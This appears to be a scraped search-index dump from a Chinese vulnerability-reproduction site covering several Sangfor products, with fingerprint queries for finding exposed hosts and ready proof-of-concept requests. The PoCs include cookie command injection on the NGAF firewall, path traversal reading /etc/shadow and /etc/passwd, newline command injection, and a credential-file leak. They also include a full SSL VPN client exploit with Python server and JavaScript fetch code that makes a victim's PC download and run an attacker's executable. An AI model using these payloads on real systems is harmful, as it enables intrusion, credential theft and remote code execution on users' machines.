","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /cgi-bin/login.cgi HTTP/1.1 Host: Cache-Control: max-age=0 Content-Type: Application/X-www-Form y-forwarded-for: 127.0.0.1 Cookie: PHPSESSID=`$(id \u003e /fwlib/sys/virus/webui/svpn_html/3.txt)`; {\"opr\":\"login\", \"data\":{\"user\": \"watchTowr\" , \"pwd\": \"watchTowr\" , \"vericode\": \"NSLB\" , \"privacy_enable\": \"0\"}} 访问 /svpn_html/3.txt ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ngaf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-login.cgi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 SG上网优化管理系统 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"SANGFOR上网优化管理\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /php/catjs.php [\"../../../../../../etc/shadow\"] ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-sg%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-catjs.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 SSL VPN 客户端远程文件下载 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞描述 深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞影响 深信服 SSL VPN ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞复现 百度\"intitle: 欢迎使用SSL VPN\"，随便找一个地方下载VPN客户端下载安装： 安装完之后访问VPN的页面，发现VPN会自动下载组件更新： 这些请求均为GET请求并附带着一些参数，我们把它一一列下来： 本地来看一下这个54530端口对应的进程是什么： 发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置： 确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对127.0.0.1的访问从而引起VPN进行组件更新。 通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。 再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作： InitECAgent -\u003e 初始化 GetEncryptKey -\u003e 获取加密密钥 DoConfigure -\u003e 配置 CheckReLogin -\u003e 检查重新登录 CheckProxySetting -\u003e 检查代理设置 UpdateControls -\u003e 更新控制 DoQueryService -\u003e 查询服务 第一个初始化的请求存在可控参数arg1： https://127.0.0.1:54530/ECAgent/?op=InitECAgent\u0026arg1=vpn.xxx.edu.cn%20443\u0026callback=EA_cb10000 参数arg1=vpn.xxx.edu.cn%20443，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为172.20.10.2 8000，然后本地搭建一个HTTP服务： python -m SimpleHTTPServer 其他的请求原封不动，依次请求一遍那一份URL 服务端成功收到请求，但是却出现了错误的提示： 首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。 现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。 如下脚本基于Python库建立一个 HTTPS 服务： # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer, SimpleHTTPServer import ssl httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志： 可以看见客户端会访问两个文件： /com/WindowsModule.xml /com/win/XXXUD.exe 先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler： import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_POST(self): form = cgi.FieldStorage() SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) Handler = ServerHandler httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 最终如上脚本支持POST方法，当时用POST方法请求时即返回文件内容。 最后，拖一个calc.exe（计算器）到HTTPS网站根目录下的/com/win/XXXUD.exe。 依次请求（经过多次复现发现，这三个请求才是重点的，其他的可以忽略）： https://127.0.0.1:54530/ECAgent/?op=InitECAgent\u0026arg1=172.20.10.2 8000\u0026callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin\u0026arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a\u0026token=50065256e83ff1bb9e01757d0d22b669\u0026callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls\u0026arg1=BEFORELOGIN\u0026callback=EA_cb10005 会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器： Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可： \u003cscript\u003e // 服务器IP和端口 var ip = \"172.20.10.2\"; var port = \"4443\"; var poc_list = [\"https://127.0.0.1:54530/ECAgent/?op=InitECAgent\u0026arg1=\" + ip + \" \" + port + \"\u0026Guid=\u0026callback=EA_cb10000\", \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin\u0026arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e\u0026token=c4202416e283e60809d3b1e04e4bae6b\u0026Guid=\u0026callback=EA_cb10003\", \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls\u0026arg1=BEFORELOGIN\u0026Guid=\u0026callback=EA_cb10005\"]; for(var i=0; i\u003cpoc_list.length; i++){ setTimeout(fetch(poc_list[i]),\"2000\"); } \u003c/script\u003e 其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的/com/win/目录下有一个XXXUD.exe文件。 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"参考文章 https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-ssl-vpn-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"深信服 应用交付报表系统 download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 应用交付报表系统 download.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器任意文件 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 应用交付报表系统 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"SANGFOR-应用交付报表系统\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /report/download.php?pdf=../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 应用交付管理系统 login 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 应用交付管理系统 login 存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 应用交付管理系统 7.0.8-7.0.8R5 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 fid=\"iaytNA57019/kADk8Nev7g==\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /rep/login clsMode=cls_mode_login%0Als%0A\u0026index=index\u0026log_type=report\u0026loginType=account\u0026page=login\u0026rnd=0\u0026userID=admin\u0026userPsw=123 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 应用交付管理系统 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"SANGFOR-应用交付管理系统\" ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /tmp/updateme/sinfor/ad/sys/sys_user.conf ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"深信服 日志中心 c.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 深信服 日志中心 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行 ","date":"0001-01-01","objectID":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E6%97%A5%E5%BF%97%E4%B8%AD%E5%BF%83-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 深信服 日志中心 